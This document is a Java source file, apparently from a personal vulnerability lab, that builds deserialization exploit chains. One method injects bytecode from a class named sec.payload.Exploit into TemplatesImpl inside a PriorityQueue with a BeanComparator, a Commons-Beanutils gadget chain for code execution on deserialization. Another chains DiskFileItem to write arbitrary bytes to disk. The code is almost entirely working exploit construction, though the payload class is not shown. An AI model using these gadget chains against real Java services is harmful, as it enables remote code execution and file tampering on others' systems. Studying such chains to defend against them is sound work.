package sec.xtrfr;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.DefaultBeanIntrospector;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.beanutils.SuppressPropertiesBeanIntrospector;
import org.springframework.context.annotation.Bean;
import sec.utils.CustomBeanIntrospector;
import sec.utils.XLSXloader;
import org.apache.poi.util.TempFile;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;
import java.util.PriorityQueue;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;


public class Main {

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }


    public static void setFieldValue(Object obj, String fieldName, Object value)  throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getEvilCode(String classname) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        String classpath = "target/classes/";
        pool.insertClassPath(classpath);
        CtClass clazzz = pool.get(classname);
        byte[] code = clazzz.toBytecode();
        return code;
    }


    public static void main1(String[] args) throws  Exception {
//        XLSXloader loader = new XLSXloader();
//        loader.readExcelData("/Users/xt03102/Desktop/JavaProjects/vulnLab/docs/work.xlsx", "hello-kitty");
        byte[] bytes = "something that would execute.".getBytes("UTF-8");
        File repository = new File("/Users/xt03102/Downloads/aaa");

        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);

        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);

        Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem, dfos);

        Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
        field2.setAccessible(true);
        field2.set(diskFileItem, bytes);
        serialize(diskFileItem);
        unserialize("ser.bin");
    }


    public static void main2(String[] args) throws  Exception {
        // generate a evil bytecodes.
        byte[] evilCode = getEvilCode("sec.payload.Exploit");
//        CustomBeanIntrospector inspector = new CustomBeanIntrospector();
        List<String> list = new ArrayList<String>();
        list.add("outputProperties");
//        PropertyUtils.addBeanIntrospector(new SuppressPropertiesBeanIntrospector(list));

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{evilCode});
        setFieldValue(templates,"_name","feng");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator("outputProperties");
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);

        setFieldValue(priorityQueue,"queue",new Object[]{templates,templates});
        setFieldValue(priorityQueue,"size",2);
        serialize(priorityQueue);
        unserialize("ser.bin");

    }


    public static void main(String[] args) throws  Exception {
        // generate a evil bytecodes.
        String fileName = "file:///Users/xt03102/Downloads/Tempfiler";
        File file1 = TempFile.createTempFile(fileName, "txt");
        File file2 = new File("/Users/xt03102/Downloads/Tempfilerb.txt");
        FileOutputStream fos = new FileOutputStream(file2);

        fos.write("hahahahahahahahahahahahahahahahahah".getBytes());
    }

}
